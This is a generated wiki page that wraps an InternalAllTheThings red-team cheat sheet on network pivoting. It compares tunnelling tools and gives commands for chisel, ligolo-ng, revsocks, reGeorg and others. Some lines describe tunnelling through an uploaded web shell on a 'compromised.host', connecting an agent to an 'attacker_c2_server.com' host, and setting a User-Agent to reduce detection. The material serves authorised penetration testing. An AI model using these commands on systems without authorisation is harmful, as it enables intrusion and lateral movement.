---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Network Pivoting Tools

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-pivoting-network-pivoting-tools` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/pivoting/network-pivoting-tools.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Network Pivoting Tools](../../topics/redteam/network-pivoting-tools.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-pivoting-network-pivoting-tools |
| name | Network Pivoting Tools |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/pivoting/network-pivoting-tools.md |

## Preserved Source Material

````yaml
_body: "# Network Pivoting Tools\n\n## Tools Comparison\n\nComparison table showing platform support (Windows, Linux, macOS),\
  \ available polling methods (HTTPS, WebSockets), and supported SOCKS versions (4/5).\n\n| Name         | SOCKS4 | SOCKS5\
  \ | SOCKET | HTTPS | Web Socket | Windows | Linux | MacOS  | Tun Interface |\n| ------------ | ------ | ------ | ------\
  \ | ----- | ---------- | ------- | ----- | -----  | ------------  |\n| SSH          |     ✅ |     ✅ |     ✅ |    ❌ |   \
  \      ❌ |     ✅  |   ✅  |     ✅ |           ❌ |\n| reGeorg      |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  | \
  \  ✅  |     ✅ |           ❌ |\n| pivotnacci   |     ✅ |     ✅ |     ❌ |    ✅ |         ❌ |     ✅  |   ✅  |     ✅ |     \
  \      ❌ |\n| wstunnel     |     ✅ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |\n| chisel\
  \       |     ❌ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |\n| revsocks     |     ❌ |   \
  \  ✅ |     ✅ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |\n| ligolo-ng    |     ❌ |     ❌ |     ✅ |    ❌ |\
  \         ✅ |     ✅  |   ✅  |     ✅ |           ✅ |\n| gost         |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅ \
  \ |   ✅  |     ✅ |           ✅ |\n| rpivot       |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |  \
  \         ❌ |\n\n## Tools\n\n### wstunnel\n\n* [erebe/wstunnel](https://github.com/erebe/wstunnel) - Tunnel all your traffic\
  \ over Websocket or HTTP2 - Bypass firewalls/DPI - Static binary available\n\n```ps1\nwstunnel server wss://[::]:8080\n\
  wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://myRemoteHost:8080\ncurl -x socks5h://127.0.0.1:8888\
  \ http://google.com/\n```\n\n### chisel\n\n* [jpillora/chisel](https://github.com/jpillora/chisel) - A fast TCP/UDP tunnel\
  \ over HTTP\n\n```powershell\nchisel server -p 8008 --reverse\nchisel.exe client YOUR_IP:8008 R:socks\n```\n\n### revsocks\n\
  \n* [kost/revsocks](https://github.com/kost/revsocks) - Reverse SOCKS5 implementation in Go\n\nReverse SOCKS using websocket\n\
  \n```ps1\nrevsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls -ws\nrevsocks -connect https://clientIP:8443\
  \ -pass SuperSecretPassword -ws\n```\n\nReverse SOCKS using TLS encryption\n\n```ps1\nrevsocks -listen :8443 -socks 127.0.0.1:1080\
  \ -pass SuperSecretPassword\nrevsocks -connect clientIP:8443 -pass SuperSecretPassword\n```\n\nReverse SOCKS using TCP\n\
  \n```ps1\nrevsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls\nrevsocks -connect clientIP:8443 -pass\
  \ SuperSecretPassword -tls\n```\n\n* Set a strong password on the connection: `-pass Password1234`\n* Use an authenticated\
  \ proxy: `-proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass`\n* Define a User-Agent to reduce detections:\
  \ `-useragent \"Mozilla 5.0/IE Windows 10\"`\n\n### ssh\n\n```bash\nssh -N -f -D [listenport] [user]@[host]\n```\n\n###\
  \ reGeorg\n\n* [sensepost/reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver\
  \ and create SOCKS proxies through the DMZ. Pivot and pwn.\n\n```python\npython reGeorgSocksProxy.py --listen-port 8080\
  \ --url http://compromised.host/shell.jsp\n```\n\n* **Step 1**. Upload tunnel.(`aspx|ashx|jsp|php`) to a webserver.\n* **Step\
  \ 2**. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py\n\
  \n### pivotnacci\n\n* [blackarrowsec/pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections\
  \ through HTTP agents.\n\n```powershell\npip3 install pivotnacci\nusage: pivotnacci [-h] [-s addr] [-p port] [--verbose]\
  \ [--ack-message message]\n                  [--password password] [--user-agent user_agent]\n                  [--header\
  \ header] [--proxy [protocol://]host[:port]]\n                  [--type type] [--polling-interval milliseconds]\n      \
  \            [--request-tries number] [--retry-interval milliseconds]\n                  url\n\npivotnacci  https://domain.com/agent.php\
  \ --password \"s3cr3t\" --polling-interval 2000\n```\n\n### ligolo\n\nInstead of using a SOCKS proxy or TCP/UDP forwarders,\
  \ Ligolo-ng creates a userland network stack using Gvisor.\n\n* [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)\
  \ - An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.\n* [sysdream/ligolo](https://github.com/sysdream/ligolo)\
  \ - Reverse Tunneling made easy for pentesters.\n\n```ps1\n./proxy -h # Help options\n./proxy -autocert # Automatically\
  \ request LetsEncrypt certificates\n./proxy -selfcert # Use self-signed certificates\n./agent -connect attacker_c2_server.com:11601\n\
  \nligolo-ng » session \n? Specify a session : 1\n\ninterface_create --name ligolo\nroute_add --name ligolo --route 10.24.0.0/24\n\
  tunnel_start --tun ligolo\n```\n\n### gost\n\n* [ginuerzh/gost](https://github.com/ginuerzh/gost) - GO Simple Tunnel - a\
  \ simple tunnel written in golang\n\n```ps1\ngost -L=socks5://:1080 # server\ngost -L=:8080 -F=socks5://server_ip:1080?notls=true\
  \ # client\n```\n\n### sshuttle\n\n* [sshuttle/sshuttle](https://github.com/sshuttle/sshuttle) - Transparent proxy server\
  \ that works as a poor man's VPN. Forwards over ssh.\n\n```ps1\nsshuttle -vvr user@10.10.10.10 10.1.1.0/24\nsshuttle -vvr\
  \ root@10.10.10.10 10.1.1.0/24 -e \"ssh -i ~/.ssh/id_rsa\" \n```\n\n## References\n\n* [GO Simple Tunnel - Documentation](https://gost.run/en/)\n\
  * [Ligolo-ng - Documentation](https://docs.ligolo.ng/)\n* [sshutle - Documentation](https://sshuttle.readthedocs.io/en/stable/usage.html)"
_relative_path: redteam/pivoting/network-pivoting-tools.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/pivoting/network-pivoting-tools.md
````
